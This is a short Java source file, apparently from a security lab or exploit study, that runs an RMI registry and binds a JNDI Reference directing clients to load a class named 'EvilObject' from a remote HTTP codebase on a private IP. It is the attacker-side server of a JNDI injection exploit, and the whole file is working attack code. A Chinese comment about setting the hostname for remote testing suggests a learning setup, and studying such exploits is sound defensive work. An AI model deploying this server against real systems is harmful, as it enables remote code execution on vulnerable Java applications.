import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilRmiService {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        //这里注意要设置hostname，否则远程测试的时候会报错 多谢@深夜饮酒 师傅
        System.setProperty("java.rmi.server.hostname","192.168.199.182");
        Reference refObj = new Reference("Evil", "EvilObject", "http://192.168.199.182:8899/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("Binding 'refObjWrapper' to 'rmi://192.168.199.182:1099/refObj'");
        registry.bind("refObj", refObjWrapper);
    }
}